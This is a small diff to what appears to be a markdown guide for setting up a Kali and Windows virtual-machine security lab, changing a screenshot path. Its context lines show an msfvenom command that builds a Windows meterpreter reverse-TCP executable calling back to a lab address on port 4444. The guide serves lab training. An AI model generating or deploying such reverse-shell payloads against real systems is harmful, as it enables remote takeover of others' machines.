@@ -48,7 +48,7 @@ Create two VMs with these specs:
 | Windows   | 4 GB   | 40+ GB    | Windows 10 |
 
 📸 *Screenshot Example:*  
-![VM Creation](./screenshots/vm-creation.png)
+![VM Creation](./screenshots/kali-vm-details.png)
 
 ---
 
@@ -95,4 +95,5 @@ In later parts, we generate a reverse shell using `msfvenom`:
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -f exe > shell.exe
+
 
